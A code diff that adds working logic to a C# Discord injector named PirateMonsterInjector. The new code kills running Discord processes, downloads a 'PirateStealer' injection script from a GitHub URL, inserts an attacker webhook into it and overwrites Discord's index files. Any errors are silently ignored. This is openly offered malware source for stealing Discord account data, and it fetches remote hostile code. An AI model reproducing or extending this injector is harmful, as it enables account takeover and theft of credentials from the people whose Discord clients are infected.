@@ -1,5 +1,6 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Net;
@@ -17,6 +18,7 @@ namespace PirateMonsterInjector
             {
                 if (item.Contains("cord"))
                 {
+                    
                     discords.Add(item);
                 }
 
@@ -60,14 +62,35 @@ namespace PirateMonsterInjector
             return path;
         }
 
+        static void DiscordProcesses()
+        {
+            foreach (var item in Process.GetProcesses())
+            {
+                if (item.ProcessName.Contains("iscord"))
+                {
+                    item.Kill();
+                }
+            }
+
+        }
         static void Main(string[] args)
         {
+            DiscordProcesses();
             WebClient client = new WebClient();
-            string script = client.DownloadString("");
+            string script = client.DownloadString("https://raw.githubusercontent.com/Stanley-GF/PirateStealer/main/src/Injection/injection");
+            Console.Write(script);
             foreach (var item in GetDiscords())
             {
-                File.WriteAllText(GetIndex(item), script.Replace("%WEBHOOK_LINK%", Settings.Webhook));
-                Console.WriteLine(GetIndex(item));
+                try
+                {
+                    File.WriteAllText(GetIndex(item), script.Replace("%WEBHOOK_LINK%", Settings.Webhook));
+                    Console.WriteLine(GetIndex(item));
+                }
+                catch (Exception)
+                {
+
+
+                }
             }
             Console.ReadKey();
         }
